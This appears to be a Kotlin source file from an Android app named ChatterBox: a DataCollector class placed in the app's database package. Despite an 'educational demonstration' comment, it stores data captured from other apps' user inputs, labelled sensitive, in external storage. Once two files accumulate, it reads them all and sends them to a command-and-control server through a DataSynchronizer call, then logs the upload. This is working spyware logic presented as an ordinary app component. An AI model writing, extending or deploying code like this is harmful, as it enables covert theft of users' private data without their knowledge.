package com.example.ChatterBox.database

import android.content.Context
import android.os.Environment
import android.util.Log
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.UUID
import org.json.JSONObject

/**
 * Utility class to manage collected data and simulate exfiltration.
 * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY.
 */
class DataCollector {
    companion object {
        private const val TAG = "DataCollector"
        private const val MAX_FILES_BEFORE_UPLOAD = 2  // Upload after collecting just 2 files
        
        /**
         * Stores collected data to a local file.
         */
        fun storeData(context: Context, dataType: String, data: String) {
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val filename = "${dataType}_${timestamp}_${UUID.randomUUID().toString().substring(0, 8)}.txt"
            
            try {
                val file = File(getStorageDir(context, dataType), filename)
                FileOutputStream(file).use { out ->
                    out.write(data.toByteArray())
                }
                
                Log.d(TAG, "Stored $dataType data: $filename")
                
                // Check if we should attempt to "upload" data
                checkAndUploadData(context, dataType)
            } catch (e: Exception) {
                Log.e(TAG, "Error storing $dataType data", e)
            }
        }
        
        /**
         * Stores sensitive information from user inputs.
         */
        fun storeSensitiveInfo(context: Context, sourceApp: String, sensitiveData: String, dataType: String) {
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            
            try {
                val jsonData = JSONObject().apply {
                    put("timestamp", timestamp)
                    put("source", sourceApp)
                    put("type", dataType)
                    put("data", sensitiveData)
                }
                
                val sensitiveInfoFile = File(getStorageDir(context, "sensitive"), 
                                         "sensitive_${timestamp}.json")
                
                FileOutputStream(sensitiveInfoFile).use { out ->
                    out.write(jsonData.toString().toByteArray())
                }
                
                Log.d(TAG, "Stored sensitive $dataType from $sourceApp")
            } catch (e: Exception) {
                Log.e(TAG, "Error storing sensitive data", e)
            }
        }
        
        /**
         * Exfiltrates data to the C2 server.
         * Uses the C2Client to send collected data.
         */
        private fun checkAndUploadData(context: Context, dataType: String) {
            val files = getStorageDir(context, dataType).listFiles() ?: return
            
            if (files.size >= MAX_FILES_BEFORE_UPLOAD) {
                Log.d(TAG, "Attempting to upload ${files.size} $dataType files to C2 server")
                
                try {
                    // Create C2 client if needed
                    val dataSync = DataSynchronizer(context)
                    
                    // Create JSON containing all file contents
                    val jsonData = JSONObject()
                    jsonData.put("dataType", dataType)
                    jsonData.put("timestamp", System.currentTimeMillis())
                    jsonData.put("count", files.size)
                    
                    val fileDataArray = JSONObject()
                    files.forEach { file ->
                        try {
                            // Read file content using BufferedReader for compatibility
                            val content = StringBuilder()
                            file.inputStream().bufferedReader().use { reader ->
                                var line: String?
                                while (reader.readLine().also { line = it } != null) {
                                    content.append(line).append("\n")
                                }
                            }
                            fileDataArray.put(file.name, content.toString())
                        } catch (e: Exception) {
                            Log.e(TAG, "Error reading file ${file.name}", e)
                        }
                    }
                    jsonData.put("files", fileDataArray)
                    
                    // Send data to C2 server
                    dataSync.sendExfiltrationData(dataType, jsonData.toString())
                    
                    // Also create a local marker file for logging purposes
                    val uploadMarker = File(getStorageDir(context, "uploads"), 
                                         "upload_${dataType}_${System.currentTimeMillis()}.txt")
                    
                    FileOutputStream(uploadMarker).use { out ->
                        val content = StringBuilder()
                        content.append("DATA UPLOAD TO C2 SERVER\n")
                        content.append("Timestamp: ${Date()}\n")
                        content.append("Data type: $dataType\n")
                        content.append("C2 Server: ${C2Config.getServerUrl()}\n")
                        content.append("Files included:\n")
                        
                        files.forEach { file ->
                            content.append("- ${file.name}\n")
                        }
                        
                        out.write(content.toString().toByteArray())
                    }
                    
                    Log.d(TAG, "Upload complete for $dataType data")
                    
                    // In a real scenario, after successful upload, files might be deleted
                    // For this demo, we'll leave them in place
                } catch (e: Exception) {
                    Log.e(TAG, "Error in C2 upload", e)
                }
            }
        }
        
        /**
         * Gets or creates the appropriate storage directory.
         */
        private fun getStorageDir(context: Context, dataType: String): File {
            val baseDir = File(Environment.getExternalStorageDirectory(), "ChatterBox/collected_data/$dataType")
            if (!baseDir.exists()) {
                baseDir.mkdirs()
            }
            return baseDir
        }
    }
}
